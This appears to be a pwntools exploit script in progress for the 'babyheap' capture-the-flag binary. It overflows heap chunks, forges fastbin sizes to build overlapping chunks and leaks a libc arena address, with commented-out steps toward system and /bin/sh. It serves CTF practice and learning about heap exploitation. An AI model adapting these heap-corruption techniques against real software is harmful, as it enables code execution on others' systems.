#!/usr/bin/env python
# -*- coding: utf8 -*-

from pwn import *
import sys

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ', timeout=1)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data


import os
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

if __name__ == "__main__":
    # context.terminal = [ "/usr/bin/zsh" ]
    # context.terminal = [ "bash" ]
    context.terminal = ['tmux', 'splitw', '-v']
    context.log_level = 'debug'
    # -------------------------------------------------------
    # libc = ELF(LIBC)
    # system_offset = libc.symbols['system']
    # # print(system_offset)
    # print(hex(system_offset))
    # binsh_offset = next(libc.search('/bin/sh\x00'))
    # print(hex(binsh_offset))
    # -------------------------------------------------------

    # p = process("./babyheap")
    # tty  /dev/pts/19
    # break execve
    # continue
    # p.debug()
    # gdb.attach(p, '''''')

    if 1 :
        r = gdb.debug('./babyheap', '''
dir /usr/src/glibc/glibc-2.23/malloc/

set verbose on

set print pretty on

source /home/ubuntu/.gdbinit-gef.py
gef config context.nb_lines_code 10

define n
next
heap chunks
heap bins
end

# tty /dev/pts/27
# gef config context.redirect /dev/pts/26

gef config context.layout ""

source helper.py

# break calloc
# commands $bpnum
p $rax
# finish
# p *(struct malloc_chunk *) ($rax - 0x10)

# heap chunks
# heap bins fast
# ctx stack

# continue
# end

# break free
# commands $bpnum
# heap chunks
# p $rax
# fin
# p *(struct malloc_chunk *) ($rax - 0x10)
#
# # heap chunks
# # heap bins fast
# # ctx stack
# continue
# end

continue
        ''')
    else:
        r = process("./babyheap", stdout=PIPE)


    alloc(0x10) # 0
    alloc(0x10) # 1
    alloc(0x10) # 2
    alloc(0x80) # 3
    alloc(0x80) # 4

    # payload  =
    # payload += p64(0x21)
    fill(2, p64(0)*3 + p64(0x21))

    free(2)
    free(1)

    if 1:
        payload  = p64(0)*3
        payload += p64(0x21)
        payload += p8(0x60)
        fill(0, payload)

        alloc(0x10)
        alloc(0x10)

    if 1:
        payload  = p64(0)*7
        payload += p64(0x91)
        fill(1, payload)

    if 1:
        free(3)
        print(dump(2))


        arena_top = u64(dump(2)[:8])
        print("arena_top_chunk: " + hex(arena_top))

    # free(2)
    # fill(2, 'A' * 0x20)

    # fill(1, 'A' * 0x10 + p64(0x00) + p64(0x71) + 'B' * 0x18)
    # print(dump(2))
    # print(dump(3))
    # alloc(0x80)
    # alloc(0x60)

    # gefâž¤  p 0x7f640ac83b78 - 0x00007f640a8bf000
    # $14 = 0x3c4b78

    # alloc(0x100)            # 4
    # fill(4, "E" * 0x100)            # 4
    #
    # # free(4)
    # free(1)
    # free(2)

    # payload  = p64(0xAAAAAAAAAAAAAAAA)*5
    # payload += p64(0x31)
    # payload += p64(0xBBBBBBBBBBBBBBBB)*5
    # payload += p64(0x31)
    # payload += p8(0xc0)
    # fill(0, payload)
    #
    #
    # payload  = p64(0xCCCCCCCCCCCCCCCC)*5
    # payload += p64(0x31)    # Corrupting smallbin->size to pass allocation assert
    # fill(3, payload)
    # pause()
    #
    # alloc(0x20)
    # pause()
    # alloc(0x20)
    # pause()

    r.interactive()

    # log.info("For remote: %s HOST PORT" % sys.argv[0])
    # if len(sys.argv) > 1:
    #     r = remote(sys.argv[1], int(sys.argv[2]))
    #     exploit(r)
    # else:
    #     r = process(
    #         ['./babyheap'],
    #         env={"LD_PRELOAD":"./libc.so.6"}
    #     )
    #     print util.proc.pidof(r)
    #     pause()
    #     exploit(r)
